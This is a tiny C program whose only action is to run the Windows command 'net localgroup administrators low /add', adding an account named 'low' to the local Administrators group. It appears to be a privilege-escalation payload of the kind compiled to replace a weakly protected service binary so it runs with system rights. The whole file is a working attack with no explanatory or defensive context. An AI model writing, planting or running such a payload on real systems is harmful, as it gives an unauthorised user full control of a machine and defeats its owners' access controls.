#include <stdlib.h>

int main()
{
	int i;
	i = system("net localgroup administrators low /add");

	return 0;
}
